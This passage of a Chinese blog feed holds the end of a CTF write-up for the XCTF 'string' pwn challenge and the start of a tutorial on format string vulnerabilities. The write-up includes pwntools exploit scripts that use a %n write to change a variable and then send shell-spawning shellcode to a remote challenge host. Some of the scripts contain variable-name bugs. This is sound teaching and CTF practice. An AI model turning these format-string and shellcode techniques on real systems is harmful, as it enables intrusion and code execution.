wizard, we will give you hand, you can not defeat dragon by yourself ...</span><br><span class="line">we will tell you two secret ...</span><br><span class="line">secret[0] is 15812a0</span><br><span class="line">secret[1] is 15812a4</span><br><span class="line">do not tell anyone </span><br><span class="line">What should your character&apos;s name be:// 第1处输入</span><br><span class="line">&gt; hello,world!</span><br><span class="line"></span><br><span class="line">Creating a new player.</span><br><span class="line"> This is a famous but quite unusual inn. The air is fresh and the</span><br><span class="line">marble-tiled ground is clean. Few rowdy guests can be seen, and the</span><br><span class="line">furniture looks undamaged by brawls, which are very common in other pubs</span><br><span class="line">all around the world. The decoration looks extremely valuable and would fit</span><br><span class="line">into a palace, but in this city it&apos;s quite ordinary. In the middle of the</span><br><span class="line">room are velvet covered chairs and benches, which surround large oaken</span><br><span class="line">tables. A large sign is fixed to the northern wall behind a wooden bar. In</span><br><span class="line">one corner you notice a fireplace.</span><br><span class="line">There are two obvious exits: east, up.</span><br><span class="line">But strange thing is ,no one there.</span><br><span class="line">So, where you will go?east or up?:// 第2处输入</span><br><span class="line">&gt; east</span><br><span class="line"></span><br><span class="line">You travel a short distance east.That&apos;s odd, anyone disappear suddenly</span><br><span class="line">, what happend?! You just travel , and find another hole</span><br><span class="line">You recall, a big black hole will suckk you into it! Know what should you do?</span><br><span class="line">go into there(1), or leave(0)?:// 第3处输入</span><br><span class="line">&gt; 1</span><br><span class="line"></span><br><span class="line">A voice heard in your mind</span><br><span class="line">&apos;Give me an address&apos;// 第4处输入</span><br><span class="line">&gt; 1111</span><br><span class="line"></span><br><span class="line">And, you wish is:// 第5处输入</span><br><span class="line">&gt; nihao</span><br><span class="line"></span><br><span class="line">Your wish is</span><br><span class="line">nihaoI hear it, I hear it....</span><br><span class="line">Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!</span><br><span class="line">Dragon say: HaHa! you were supposed to have a normal</span><br><span class="line">RPG game, but I have changed it! you have no weapon and </span><br><span class="line">skill! you could not defeat me !</span><br><span class="line">That&apos;s sound terrible! you meet final boss!but you level is ONE!</span><br><span class="line">The End.....Really?</span><br></pre></td></tr></table></figure><blockquote><p>通过正常的输入，发现程序能正常运行，但是并不能满足<code>*(_DWORD *)a1 == *(_DWORD *)(a1 + 4)</code>，因为v4的值从一开始就被赋值为<code>68</code>，v4[1]的值被赋值为<code>85</code>，所以等式是肯定不成立的。</p></blockquote><h4 id="5理清思路"><a class="markdownIt-Anchor" href="#5理清思路"></a> <code>5.理清思路</code></h4><p>      经过上述分析之后，现在再理清一下该题目的思路：</p><ol><li>我们要想成功执行shellcode，就必须使得v4[0]=v4[1]，那么我们怎么样才能把v4的值改为85，或者把v4[1]的值改为68？</li><li>修改变量值的两种方法：<ul><li>通过栈溢出，从而达到修改局部变量值的目的，但是本题开启了Canary，所以不容易实现</li><li>因为在本题中发现了格式化字符串漏洞，所以可以根据格式化字符串漏洞进行修改，那怎么通过格式化字符串漏洞的手段来修改v4或者v4[1]的值呢？</li></ul></li><li>在<a href="https://muzibing.github.io/2020/05/29/2020.05.29%EF%BC%88119%EF%BC%89">详解格式化字符串漏洞</a>中存在一道例题，就是把变量a的值修改为8，从而执行if分支。我们可以根据那个原理来做本题，这里我们只对v4进行修改，如果相对v4[1]修改的话，可以自己尝试一下。</li></ol><h3 id="0x02-解题步骤"><a class="markdownIt-Anchor" href="#0x02-解题步骤"></a> <code>0x02 解题步骤</code></h3><h4 id="1查找-format-地址的参数偏移"><a class="markdownIt-Anchor" href="#1查找-format-地址的参数偏移"></a> <code>1.查找 format 地址的参数偏移</code></h4><p>      在这里我们忽略前4个的输入和输出结果，直接来到第5个输入处，首先一定要知道该<code>pwn</code>是一个<code>64</code>位的ELF文件，我们在第5个输入处输入<code>AAAAAAAA%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx</code>，查看结果如下：</p><p><img src="/images/120-2.jpg" alt></p><blockquote><p>通过上图可以发现<code>AAAAAAAA</code>的十六进制<code>4141414141414141</code>使printf函数的第 9 个参数，使格式化字符串的第 8 个参数，我们来验证一下我们的猜想对不对，下面给出在gdb中的调试结果，如下图：</p></blockquote><p><img src="/images/120-3.jpg" alt></p><p><code>知识点2：64位下的传参约定</code><sup>[2]</sup></p><blockquote><ul><li>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9；</li><li>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</li></ul></blockquote><p><code>知识点3：格式化字符串的控制符</code><sup>[3]</sup></p><blockquote><ul><li>%x: 他可以将对应参数的值以16进制打印出来，<strong>%x只能打印4个字节，%lx或者%llx可以打8个字节</strong>。如%x表示要泄漏对应偏移4字节长度的16进制数据，%llx表示要泄漏对应偏移8字节长度的16进制数据。</li><li>%s：可以打印<strong>对应参数所指向的字符串</strong>。</li><li>%n: 可以修改对应参数（这个参数是指针）所指向的变量的值为%n之前打印的字符的个数，如果是32位程序，则这个指针变量为4字节，64位程序这个指针变量为8字节，这是因为不同位数，地址的长度不同。**还要注意%n是修改对应参数指向的地址起，4字节长度的空间。，%hn，是修改2字节的地址空间，%hhn是1字节的地址空间，%lln是修改8字节的地址空间。**像修改地址这样的大数据，如果一次输出太多的字节可能会引起程序崩溃，则可以利用%hn，%hhn来一部分一部分的写入，</li></ul></blockquote><h4 id="2将-v4-的地址存放在-format-首地址处"><a class="markdownIt-Anchor" href="#2将-v4-的地址存放在-format-首地址处"></a> <code>2.将 v4 的地址存放在 format 首地址处</code></h4><p>      和<a href="https://muzibing.github.io/2020/05/29/2020.05.29%EF%BC%88119%EF%BC%89">详解格式化字符串漏洞</a>一样，我们将 v4 的地址存放在 format 首地址处，因为前面已经有了8bytes，那么还需要 <code>85-8=77</code> 个字符，然后再通过%8$n（因为format的首地址是格式化字符串的第8个参数），又因为前面程序已经将v4的地址打印了出来，所以正常来说payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = str(p64(v4_addr),encoding=&quot;unicode_escape&quot;) + &quot;a&quot;*77 + &quot;%8$n&quot;</span><br></pre></td></tr></table></figure><p>      如果正常执行的话，栈中和寄存器的情况如下：</p><p><img src="/images/120-6.png" alt></p><p>      那么最终的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/sssusr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>, arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>,endian=<span class="string">"little"</span>)</span><br><span class="line"><span class="comment">#r = remote("124.126.19.106",38510)</span></span><br><span class="line">r = process(<span class="string">"./pwn"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"secret[0] is "</span>)</span><br><span class="line">v4_addr = int(r.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"[*] v4_addr is"</span>,hex(v3_addr))</span><br><span class="line"> </span><br><span class="line">payload = str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>) + <span class="string">"a"</span>*<span class="number">77</span> + <span class="string">"%8$n"</span></span><br><span class="line">print(<span class="string">"[+] p64(v4_addr) is"</span>,str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"What should your character's name be:"</span>,<span class="string">"LISHUO"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"So, where you will go?east or up?:"</span>,<span class="string">"east"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"go into there(1), or leave(0)?:"</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"'Give me an address'"</span>,<span class="string">"1111"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"And, you wish is:"</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>      执行该exp文件，并没有得到我们想要的结果（打印出&quot;Wizard: I will help you! USE YOU SPELL&quot;），下图是程序停止的地方：</p><p><img src="/images/120-5.jpg" alt></p><blockquote><p>为什么会在这个地方停止运行了呢？这里涉及到一个知识点程序遇到”\x00“会发生截断<sup>[3]</sup>，但是将<code>\x00</code>其放在字符串的末尾就可以解决了<sup>[4]</sup>，那么下一步就是要看一下，在那里发生了截断，从上图中可以看出，应该是因为v4地址在小段输入时产生了\x00，我们在运行exp.py程序前，提前想到将v4的地址以小段的形式打印了出来，那么我们去看一下：<code>[+] p64(v3_addr) is ÒÔ\x00\x00</code>果然含有截断符号，那么下一步我们要把v4的地址放到最后，这样就不会发生截断，因此构造出了</p><p><code>[&quot;a&quot;*85][%length$n][padding][v4_addr]</code></p><ul><li><p>中间部分为<code>%length$n</code>和<code>padding</code></p></li><li><p>前部分应该是长度为85的字符串，我们可以用”a“*85进行填充</p></li><li><p>由于v4的地址需要单独放在一个64位的地址空间，所以这里需要对齐：</p><ul><li>”a“*85：这是85个字符长度</li><li>%length$n：由于length不确定，所以该长度不确定</li><li>p64(v4_addr)：长度为8 bytes，但是需要地址对齐</li></ul><p>我们现在来计算length的值，因为”a“*85的长度除以8等于10.625，又因为前8个”a“是格式化字符串的第8个参数，所以length的数值肯定大于10，如果大于10的话，那么85个”a“和<code>%length$n</code>的长度为90，因为90不能整除8，所以还需要6个字符作为<code>padding</code>，这样算下来(85+5+6)/8=96/8=12，再加上前面7个参数等于19，所以说v4_addr相当于格式化字符串的第20个参数。</p></li></ul></blockquote><p>      经过上述分析，我们又重新得到一个新的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>, arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>,endian=<span class="string">"little"</span>)</span><br><span class="line"><span class="comment">#r = remote("124.126.19.106",38510)</span></span><br><span class="line">r = process(<span class="string">"./pwn"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"secret[0] is "</span>)</span><br><span class="line">v4_addr = int(r.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"[*] v4_addr is"</span>,hex(v4_addr))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#payload = str(p64(v4_addr),encoding="unicode_escape") + "a"*77 + "%8$n"</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">85</span> + <span class="string">"%20$n"</span> + <span class="string">"a"</span>*<span class="number">6</span> + str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>) </span><br><span class="line">print(<span class="string">"[+] p64(v4_addr) is"</span>,str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"What should your character's name be:"</span>,<span class="string">"LISHUO"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"So, where you will go?east or up?:"</span>,<span class="string">"east"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"go into there(1), or leave(0)?:"</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"'Give me an address'"</span>,<span class="string">"1111"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"And, you wish is:"</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="/images/120-4.png" alt></p><blockquote><p>得到的结果如上图，从得到的输出来看，我们已经成功的修改了v4的值，下面我们就写入shellcode，得到flag，完整的exp如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>, arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>,endian=<span class="string">"little"</span>)</span><br><span class="line">r = remote(<span class="string">"124.126.19.106"</span>,<span class="number">38510</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"secret[0] is "</span>)</span><br><span class="line"></span><br><span class="line">v4_addr = int(r.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"[*] v4_addr is"</span>,hex(v3_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">85</span> + <span class="string">"%20$n"</span> + <span class="string">"a"</span>*<span class="number">6</span> + str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>) </span><br><span class="line">print(<span class="string">"[+] p64(v4_addr) is"</span>,str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "a"*85 + "%7$n</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"What should your character's name be:"</span>,<span class="string">"LISHUO"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"So, where you will go?east or up?:"</span>,<span class="string">"east"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"go into there(1), or leave(0)?:"</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"'Give me an address'"</span>,<span class="string">"1111"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"And, you wish is:"</span>,payload)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">r.sendlineafter(<span class="string">"Wizard: I will help you! USE YOU SPELL"</span>,shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x03-其他方法font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-其他方法font"></a> <font color="navy"><code>0x03 其他方法</code></font></h3><p>      网上关于这道题目的做法有很多，大部分都是通过第4个输入<code>'Give me an address'</code>来改变v4的值，在这里我就不再多多赘述，这里有几个这样做法的writeup，但是里面有很多问题，希望大家能够批判性的去学习。当然在这里因为我个人水平有限的，我也不敢保证这篇writeup也不存在问题，如果存在问题，还希望大家在评论区指正说明。</p><ul><li><a href="https://blog.csdn.net/qq_43681242/article/details/103681367?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">攻防世界pwn新手练习（string）</a></li><li><a href="https://blog.csdn.net/fastergohome/article/details/103627264" target="_blank" rel="noopener">string [XCTF-PWN]CTF writeup系列7（超详细分析）</a></li></ul><h3 id="0x04-reference"><a class="markdownIt-Anchor" href="#0x04-reference"></a> <code>0x04 Reference</code></h3><p>[1] <a href="https://www.cnblogs.com/shijingxiang/articles/5185068.html" target="_blank" rel="noopener">Mmap的实现原理和应用</a></p><p>[2] <a href="http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/" target="_blank" rel="noopener">64位汇编参数传递</a></p><p>[3] <a href="http://dittozzz.top/2019/02/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">格式化串漏洞利用总结</a>⭐</p><p>[4] <a href="https://wizardforcel.gitbooks.io/q-buffer-overflow-tutorial/content/86.html" target="_blank" rel="noopener">5.1.2 ShellCode编码的用处</a></p><p>[5] <a href="https://www.cnblogs.com/junjiany/p/7055064.html" target="_blank" rel="noopener">python第一行注释是什么意思？</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-前言font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-前言font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 前言&lt;/c
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>详解格式化字符串漏洞</title>
    <link href="https://muzibing.github.io/2020/05/29/2020.05.29%EF%BC%88119%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/05/29/2020.05.29（119）/</id>
    <published>2020-05-28T16:00:00.000Z</published>
    <updated>2020-06-11T11:10:41.600Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-前言font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-前言font"></a> <font color="navy"><code>0x00 前言</code></font></h3><p>      格式化字符串漏洞是在CWE<sup>[1]</sup>（Common Weakness Enumeration，通用缺陷枚举）例表中的编号为<a href="https://cwe.mitre.org/data/definitions/134.html" target="_blank" rel="noopener">CWE-134</a>，由于在审计过程中很容易发现该漏洞，所以此类漏洞很少出现，但是在很多CTF还存在相关的题目，比如XCTF的<code>pwn新手练习区的 string</code>等，通过这两天的学习，发现还是有必要系统的归纳一下相关知识点，在这里我们以问题为导向展开学习。</p><h3 id="font-colornavy0x01-格式化字符串font"><a class="markdownIt-Anchor" href="#font-colornavy0x01-格式化字符串font"></a> <font color="navy"><code>0x01 格式化字符串</code></font></h3><h4 id="font-color-blueq1什么是格式化字符串-font"><a class="markdownIt-Anchor" href="#font-color-blueq1什么是格式化字符串-font"></a> <font color="blue"><code>Q1：什么是格式化字符串</code> </font></h4><blockquote><p><strong>格式化字符串</strong>（<strong>format string</strong>）是一些程序设计语言在格式化输出API函数中用于指定输出参数的格式与相对位置的字符串参数，例如C、C++等程序设计语言的printf类函数，其中的转换说明（conversion specification）用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。<sup>[2]</sup></p></blockquote><p>      上述内容是wiki对格式化字符串的解释，简单来说，格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。<sup>[3]</sup> 比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Hello %s, Your ID is %d"</span>, name, &amp;ID)</span><br></pre></td></tr></table></figure><p>      对于**格式化函数<code>printf</code>**来说，<code>&quot;Hello %s, Your ID is %d&quot;</code>是printf函数的第一个参数，该参数被称为<font color="red"><code>格式化字符串</code></font>，<code>name</code>是printf函数的第二个参数，<code>&amp;ID</code>是printf函数的第三个参数，其中<code>%s</code>控制<code>name</code>的输出，<code>%d</code>控制着<code>&amp;ID</code>的输出；</p><p>      对于**格式化字符串 <code>&quot;Hello &amp;s, Your ID is %d&quot;</code>**来讲，<code>name</code>是它的第一个参数，<code>&amp;ID</code>是它的第二个参数；</p><p><img src="/images/119-1.png" alt></p><blockquote><p>例如上图:</p><ul><li><p>printf函数第一个参数（格式化字符串）的地址为<code>0xffffd8a0</code>，该地址指向地址<code>0x804a00b</code>，位于栈顶<code>esp</code>；</p></li><li><p>printf函数第二个参数的地址为<code>0xffffd8b8</code>，在栈中处于<code>0xffffd8a4</code>，<code>esp+4</code>；</p></li><li><p>第三个参数为<code>0x2</code>，通过栈可以看出该数值被存放在地址为<code>0xffffd8a8</code>，栈中为<code>esp+8</code></p></li></ul><p>通过上面的例子，可以看出，该printf函数的格式化字符串中有两个控制字符<code>%s</code>和<code>%d</code>，<strong>说明栈中两个连续的高地址是格式化字符串的第1，2个参数，也是printf函数的第2，3个参数。</strong></p></blockquote><h4 id="font-color-blueq2格式化字符串函数的作用是什么-font"><a class="markdownIt-Anchor" href="#font-color-blueq2格式化字符串函数的作用是什么-font"></a> <font color="blue"><code>Q2：格式化字符串函数的作用是什么？</code> </font></h4><p>      格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的 C/C++ 程序都会利用格式化字符串函数来<strong>输出信息，调试程序，或者处理字符串</strong>。<sup>[3]</sup></p><h4 id="font-color-blueq3格式化字符串函数的组成是什么-font"><a class="markdownIt-Anchor" href="#font-color-blueq3格式化字符串函数的组成是什么-font"></a> <font color="blue"><code>Q3：格式化字符串函数的组成是什么？</code> </font></h4><p>      格式化字符串有着自己固定的格式，由三部分组成：</p><ul><li>格式化字符串函数，比如<code>printf函数</code></li><li>格式化字符串，比如<code>&quot;Hello %s, Your ID is %d&quot;</code></li><li>后续参数（可选），比如<code>name</code>和<code>&amp;ID</code></li></ul><h4 id="font-color-blueq4格式化字符串的格式是什么-fontsup23sup"><a class="markdownIt-Anchor" href="#font-color-blueq4格式化字符串的格式是什么-fontsup23sup"></a> <font color="blue"><code>Q4：格式化字符串的格式是什么？</code> </font><sup>[2]&amp;[3]</sup></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure><p><code>parameter</code>：n$，获取格式化字符串中的指定参数；n是用这个格式说明符（specifier）显示第几个参数；这使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出。 如果任意一个占位符使用了<em>parameter</em>，则其他所有占位符必须也使用<em>parameter</em>。这是<a href="https://zh.wikipedia.org/wiki/POSIX" target="_blank" rel="noopener">POSIX</a>扩展，不属于<a href="https://zh.wikipedia.org/wiki/C%E8%AF%AD%E8%A8%80" target="_blank" rel="noopener">ISO C</a>。例：printf(&quot;%2$d %2$#x; %1$d %1$#x&quot;,16,17)，产生&quot;<code>17 0x11; 16 0x10</code>&quot;</p><p><code>flags</code>：（此项省略）</p><p><code>field width</code>：输出的最小宽度；</p><p><code>Precision</code>：通常指明输出的最大长度，依赖于特定的格式化类型；</p><p><code>Length</code>：指出浮点型参数或整型参数的长度；</p><table><thead><tr><th>字符</th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>hh</code></td><td>对于整数类型，<code>printf</code>期待一个从<code>char</code>提升的<code>int</code>尺寸的整型参数。</td></tr><tr><td><code>h</code></td><td>对于整数类型，<code>printf</code>期待一个从<code>short</code>提升的<code>int</code>尺寸的整型参数。</td></tr><tr><td><code>l</code></td><td>对于整数类型，<code>printf</code>期待一个<code>long</code>尺寸的整型参数。对于浮点类型，<code>printf</code>期待一个<code>double</code>尺寸的整型参数。<br>对于字符串s类型，<code>printf</code>期待一个<code>wchar_t</code>指针参数。对于字符c类型，<code>printf</code>期待一个<code>wint_t</code>型的参数</td></tr><tr><td><code>ll</code></td><td>对于整数类型，<code>printf</code>期待一个<code>long long</code>尺寸的整型参数。Microsoft也可以使用<code>I64</code>。</td></tr><tr><td><code>L</code></td><td>对于浮点类型，<code>printf</code>期待一个<code>long double</code>尺寸的整型参数。</td></tr><tr><td><code>z</code></td><td>对于整数类型，<code>printf</code>期待一个<code>size_t</code>尺寸的整型参数。</td></tr><tr><td><code>j</code></td><td>对于整数类型，<code>printf</code>期待一个<code>intmax_t</code>尺寸的整型参数。</td></tr><tr><td><code>t</code></td><td>对于整数类型，<code>printf</code>期待一个<code>ptrdiff_t</code>尺寸的整型参数。</td></tr></tbody></table><p><code>type</code>：</p><table><thead><tr><th style="text-align:center"><strong>字符</strong></th><th style="text-align:left"><strong>描述</strong></th></tr></thead><tbody><tr><td style="text-align:center">d/i</td><td style="text-align:left">有符号十进制数值<code>int</code>。’<code>%d</code>‘与’<code>%i</code>'对于输出是同义；<br>但对于<code>scanf()</code>输入二者不同，其中<code>%i</code>在输入值有前缀<code>0x</code>或0时，分别表示16进制或8进制的值。<br>如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td style="text-align:center">u</td><td style="text-align:left">十进制<code>unsigned int</code>。<br>如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空</td></tr><tr><td style="text-align:center">c</td><td style="text-align:left">如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；<br>如果用了 l 标志，把wint_t参数转为包含两个元素的wchart_t数组，第一个元素包含要输出的字符，第二个元素为null宽字符</td></tr><tr><td style="text-align:center">o</td><td style="text-align:left">8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空</td></tr><tr><td style="text-align:center"><strong>s</strong></td><td style="text-align:left"><br>如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。<br>如果用了 l 标志，则对应函数参数指向wchar_t型的数组，输出时把每个宽字符转化为多字节字符，相当于调用wcrtomb函数</td></tr><tr><td style="text-align:center"><strong>n</strong></td><td style="text-align:left">不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</td></tr><tr><td style="text-align:center">p</td><td style="text-align:left">void * 型，输出对应变量的值。<br>printf(&quot;%p&quot;,a) 用地址的格式打印变量 a 的值;<br>printf(&quot;%p&quot;, &amp;a) 打印变量 a 所在的地址。</td></tr><tr><td style="text-align:center">x/X</td><td style="text-align:left">16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。<br>如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。<br>精度为 0 且值为 0，则输出为空</td></tr><tr><td style="text-align:center">%</td><td style="text-align:left">'<code>%</code>'字面值，不接受任何 flags, width。</td></tr></tbody></table><p><code>特别说明</code></p><blockquote><p>这里简单的介绍一下<code>%n</code>控制符，下面会用到：</p><p>%n 用于将当前字符串的长度打印到var中，例如：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc str.c -m32 -o str</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> c = <span class="number">0</span>; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"the use of %n"</span>, &amp;c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>上述结果为<code>11</code>，也就是<code>the use of</code>的长度。**具体原理：**当<code>printf</code>在输出格式化字符串的时候，会维护一个内部指针，当<code>printf</code>逐步将格式化字符串的字符打印到屏幕，当遇到<code>%</code>的时候，<code>printf</code>会期望它后面跟着一个格式字符串，因此会递增内部字符串以抓取格式控制符的输入值。这就是问题所在，<code>printf</code>无法知道栈上是否放置了正确数量的变量供它操作，如果没有足够的变量可供操作，而指针按正常情况下递增，就会产生越界访问。甚至由于%n的问题，可导致任意地址读写。<sup>[5]</sup></p></blockquote><h4 id="font-color-blueq5常见的格式化字符串函数有哪些-fontsup3sup"><a class="markdownIt-Anchor" href="#font-color-blueq5常见的格式化字符串函数有哪些-fontsup3sup"></a> <font color="blue"><code>Q5：常见的格式化字符串函数有哪些？</code> </font><sup>[3]</sup></h4><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">基本介绍</th><th style="text-align:center">类别</th></tr></thead><tbody><tr><td style="text-align:center">scanf</td><td style="text-align:center">从stdin中向特定地址中读值</td><td style="text-align:center">输入</td></tr><tr><td style="text-align:center">printf</td><td style="text-align:center">输出到 stdout</td><td 